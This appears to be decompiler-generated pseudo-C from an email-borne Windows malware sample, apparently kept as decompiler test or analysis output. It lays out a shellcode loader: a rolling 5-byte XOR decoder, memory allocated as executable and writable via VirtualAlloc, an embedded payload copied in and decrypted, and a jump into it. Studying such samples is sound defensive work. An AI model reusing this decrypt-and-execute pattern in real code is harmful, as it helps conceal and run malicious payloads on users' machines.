// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1077/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 dwArg04, Eq_92 * dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
fn00401000_entry:
l00401000:
	*dwArg10 = dwArg0C;
	word16 wLoc0C_21 = (word16) (SEQ(0x00000000, dwArg14) % 0x00000005)
	Eq_14 * dwArg04_26 = dwArg04 + dwArg14
l00401034:
	dwArg0C = dwArg0C - 0x00000001;
	branch dwArg0C != 0x00000000 l0040104B
l00401046:
	goto l004010D9
l0040104B:
	dwArg08->b0000 = (byte) ((int32) dwArg04_26->b0000 ^ (word32) dwArg18[(int32) wLoc0C_21]);
	word16 cx_68 = wLoc0C_21 + 0x0001
	wLoc0C_21 = cx_68;
	branch (int32) cx_68 != 0x00000005 l004010AF
l0040109D:
l004010AF:
	dwArg08 = dwArg08 + 1;
	dwArg04_26 = dwArg04_26 + 1;
	goto l00401034
l004010D9:
	return
fn00401000_exit:
}

void fn004010F5()
{
	code * * eax_18 = select(0x00000000, null, null, null, null);
	if (eax_18 != (code * *) 0xFFFFFFFF)
		Mem0[eax_18 + 0x00000000:word32]();
	Eq_62 ecx_45 = globals->t403004;
	Mem49[fp - 0x000001F0:word32] = fp + 0xFFFFFE74;
	Mem51[fp - 0x000001F4:word32] = 0x00000004;
	Mem54[fp - 0x000001F8:word32] = fp + 0xFFFFFE58;
	Mem56[fp - 0x000001FC:word32] = 0x00000004;
	Mem59[fp - 0x00000200:word32] = fp + 0xFFFFFE54;
	fn00401000(&fp->bFFFFFE3C, null, 0x00000000, 0x00000000, 0x00000000, 0x00000000);
	int32 dwLoc01C8_71 = 0x00000000;
	while (dwLoc01C8_71 < 0x00000010)
	{
		Mem83[fp + 0xFFFFFE3C + dwLoc01C8_71:byte] = Mem59[ecx_45 + 0x004030FA + dwLoc01C8_71:byte];
		Mem89[fp + 0xFFFFFE64 + dwLoc01C8_71:byte] = Mem83[ecx_45 + 0x004030FA + dwLoc01C8_71 + 0x00000010:byte];
		dwLoc01C8_71 = dwLoc01C8_71 + 0x00000001;
	}
	Eq_62 edx_105 = globals->t403000;
	Mem111[fp - 0x000001F4:word32] = 0x00000000;
	Mem116[fp - 0x000001FC:word32] = 0x00000004;
	fn00401000(&fp->tFFFFFE2C, &fp->tFFFFFE2C, 0x00000000, &fp->tFFFFFE2C, 0x00000000, &fp->tFFFFFE74);
	Eq_62 edx_125 = globals->t403004;
	Mem131[fp - 0x000001F4:word32] = 0x00000004;
	Mem136[fp - 0x000001FC:word32] = 0x00000004;
	fn00401000(&fp->bFFFFFE3C, &fp->tFFFFFE54, 0x00000000, &fp->tFFFFFE2C, 0x00000000, &fp->tFFFFFE74);
	Mem149[fp - 0x000001F4:word32] = 0x00003000;
	Mem154[fp - 0x000001FC:word32] = 0x00000000;
	Eq_92 * eax_155 = VirtualAlloc((Eq_244 *) 0x00000004, edx_125, 0x00000004, 0x00000040);
	GetModuleHandleW(0x00000000);
	Eq_62 dwLoc01EC_168 = 0x00000000;
	while (dwLoc01EC_168 <u edx_125)
	{
		Mem182[eax_155 + dwLoc01EC_168:byte] = Mem154[dwLoc01EC_168 + 0x00403008:byte];
		dwLoc01EC_168 = dwLoc01EC_168 + 0x00000001;
	}
	Mem189[fp - 0x000001F0:word32] = fp + 0xFFFFFE74;
	Mem191[fp - 0x000001F4:word32] = 0x00000008;
	Mem197[fp - 0x000001FC:word32] = edx_125;
	fn00401000(eax_155 - 0x00000008, eax_155, 0x00000000, &fp->ptrFFFFFE10, 0x00000000, 0x00000000);
	Mem215[fp - 0x000001F0:word32] = fp;
	Mem218[fp - 0x000001F4:word32] = fp + 0xFFFFFE74;
	Mem224[fp - 0x000001FC:word32] = edx_105;
	(eax_155 + 0x00001010)();
	return;
}

